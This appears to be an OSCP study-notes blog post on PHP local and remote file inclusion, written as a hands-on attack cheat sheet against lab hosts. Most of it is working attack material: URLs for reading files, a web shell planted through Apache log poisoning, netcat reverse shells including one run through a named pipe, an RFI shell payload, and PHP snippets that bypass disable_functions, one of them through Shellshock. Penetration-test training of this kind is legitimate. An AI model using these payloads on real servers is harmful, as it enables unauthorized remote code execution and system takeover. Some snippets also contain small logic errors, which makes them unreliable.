---
title:  "OSCP: LFI and RFI"
date:   2018-03-26 03:22:33 +0800
categories: oscp
classes:
  - landing
---

## 1. Local file inclusion (LFI)
LFI happens when an PHP page explicitly calls include function to embed another PHP page, which can be controlled by the attacker.
For example, addguestbook.php below include another PHP page that can be chosen depending on the language input:
```php
$lang = $_GET['LANG'];
include( $lang . '.php' );
```
Because the LANG field can be controlled, the attacker can put in the path to a local file.
### a. Reading arbitrary files
Windows hosts file:
`http://10.11.23.188/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00&name=test&comment=test`

### b. Contaminating apache log file and executing it
Use netcat to connect to the server and contaminate `C:/xampp/apache/logs/access.log` file:
```
root@kali:~# nc -v 10.11.23.188 80
10.11.23.188: inverse host lookup failed: Unknown host
(UNKNOWN) [10.11.23.188] 80 (http) open
 <?php echo shell_exec($_GET['cmd']);?> 
^C
```
After contamination, the access.log file on the serve is like this:
>10.11.0.105 - - [11/Mar/2018:11:24:17 -0400] "GET /addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig&name=test&comment=test HTTP/1.1" 200 369
>10.11.0.105 - - [11/Mar/2018:11:24:48 -0400] "<?php echo shell_exec($_GET['cmd']);?> " 400 366

Display the access.log file to execute the command:
`http://10.11.23.188/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig&name=test&comment=test`

### c. Transferring netcat and obtaining reverse shell
Kali:
```
mkdir /tftp 
atftpd --daemon --port 69 /tftp 
cp /usr/share/windows-binaries/nc.exe /tftp/ 
```
Windows:
```
tftp -i 10.11.0.105 get nc.exe
nc.exe -e cmd.exe 10.11.0.105 4444
```
Kali:
```
nc -lvp 4444
```
Access this URL to open the shell
`http://10.11.23.188/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=nc.exe%20-e%20cmd.exe%2010.11.0.105%204444&name=test&comment=test`
Note:
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```
is used to get the TTY shell

## 2. Remote file inclusion (RFI)
Executing a command via a remote php page:
http://10.11.23.188/addguestbook.php?LANG=http://10.11.0.105:31/evil.txt%00&name=test&comment=test

Content of `/var/www/html/evil.txt`:
```php
<?php echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe") ?>
```
Most modern php configuration disallows remote file includes of http URIs. For example: `xampp/apache/bin/php.ini`
```ini
allow_url_fopen = Off
allow_url_include = Off
```
## 3. Bypass PHP disable_functions
### Use PHP code to download file and list directory
```php
function listDir($dir) {
    if ($handle = opendir($dir)) {
        while (false !== ($entry = readdir($handle))) {
            if ($entry != "." && $entry != "..")
                echo "$entry<br>";
        }
        closedir($handle);
    }
}
function downloadFile($url, $path) {
    unlink($path);
    $file = fopen ($url, 'rb');
    if ($file) {
        $newf = fopen ($path, 'wb');
        if ($newf) {
            while(!feof($file))
                fwrite($newf, fread($file, 1024 * 8), 1024 * 8);
            fclose($file);
        }
        fclose($file);
    }
}
```
### PHP 4.2.0+, PHP 5: pcntl_exec
```php
<?php
$cmd = @$_REQUEST[cmd];
if(function_exists('pcntl_exec'))
    die('pcntl not found');

$cmd = $cmd."&pkill -9 bash >out";
pcntl_exec("/bin/bash", $cmd);
echo file_get_contents("out");        
?>
```
### PHP 5.2.3: Win32std ext Protections Bypass
```php
<?php
if (!extension_loaded("win32std")) die("win32std extension required!");
system("cmd.exe"); //just to be sure that protections work well
win_shell_execute("..\\..\\..\\..\\windows\\system32\\cmd.exe");
?>
```
### PHP 5.x: Shellshock
```php
<?php
function shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283
    if(strstr(readlink("/bin/sh"), "bash") != FALSE) {
        $tmp = tempnam(".","data");
        putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
        mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actually send any mail
    }
    else return "Not vuln (not bash)";
    $output = @file_get_contents($tmp);
    @unlink($tmp);
    if($output != "") return $output;
    else return "No output, or not vuln.";
}
?>
```
### 4. Deal with missing -e option in netcat
```php
<?php
function reverse_shell() {
    echo "Disabled functions: " . ini_get('disable_functions')."\n";
    unlink("/tmp/backpipe");
    echo shellshock("mknod /tmp/backpipe p ");
    echo shellshock("/bin/sh -c '/bin/sh 0</tmp/backpipe | nc 10.11.0.105 4444 1>/tmp/backpipe'");
}
?>
```

**References:**
- LFI:
http://resources.infosecinstitute.com/local-file-inclusion-code-execution/
https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/
https://www.sunnyhoi.com/how-to-hack-a-website-using-local-file-inclusion-lfi/
- TTY:
http://pentestmonkey.net/blog/post-exploitation-without-a-tty
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
- Reverse shell:
https://highon.coffee/blog/reverse-shell-cheat-sheet/
https://netsec.ws/?p=331
- PHP disable_functions
http://blog.safebuff.com/2016/05/06/disable-functions-bypass/
- Netcat missing -e
https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/
